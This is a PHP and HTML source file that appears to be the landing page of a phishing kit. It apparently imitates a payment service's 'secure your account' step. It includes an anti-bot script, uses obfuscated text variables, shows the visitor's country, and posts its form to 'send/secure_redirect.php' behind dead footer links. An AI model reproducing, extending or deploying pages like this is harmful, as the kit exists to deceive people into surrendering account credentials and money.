<?php

   session_start();
   error_reporting(E_ERROR | E_PARSE);

   include('anti/anti.php');
   include('include/get_lg.php');

   if(isset($_SESSION['lang_'])){
       include('langdir/'.$_SESSION['lang_']);
   }else {
       include('langdir/en.php');
   }
   
   ?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
      <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
      <link rel="shortcut icon" href="asset/img/favicon/fav.ico" />
      <link rel="apple-touch-icon" href="asset/img/icon.png" />
      <script src="asset/js/jquery.min.js"></script> <script type="text/javascript">$('.loaderOverlay').fadeIn();setTimeout(function(){$('.loaderOverlay').fadeOut();},3500);</script> 
      <link rel="stylesheet" href="asset/css/app.css" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys0x; ?></title>
   </head>
   <body>
      <div class="contentContainer" id="content">
         <div class="safeComponent" data-nemo="safeStartPage">
            <header>
               <div class="xysx-logo"></div>
            </header>
            <form method="POST" action="send/secure_redirect.php">
               <div class="safe">
                  <h1><?php echo $xys1x; ?></h1>
                  <div class="safeDescription">
                     <p class="description"><?php echo $xys2x; ?></p>
                  </div>
                  <input id="xyssubmitsecx" type="submit" name="safeContinueButton" class="button safeContinueButton primary" value="<?php echo $xys3x; ?>" />
               </div>
            </form>
         </div>
         <div class="loaderOverlay">
            <div data-nemo="loaderOverlay" class="modal-animate">
               <div class="rotate"></div>
               <div class="processing"><?php echo $xys4x; ?></div>
               <div class="loaderOverlayAdditionalElements"></div>
            </div>
            <div class="modal-overlay"></div>
         </div>
      </div>
      <footer class="footer" role="contentinfo">
         <div class="legalFooter">
            <ul class="footerGroup">
               <li> <a href="#"><?php echo $xys5x; ?></a></li>
               <li> <a href="#"><?php echo $xys6x; ?></a></li>
               <li> <a href="#"><?php echo $xys7x; ?></a></li>
               <li> <a href="#"><?php echo $xys8x; ?></a></li>
            </ul>
         </div>
      </footer>
      <script src="asset/js/sec.js"></script> 
   </body>
</html>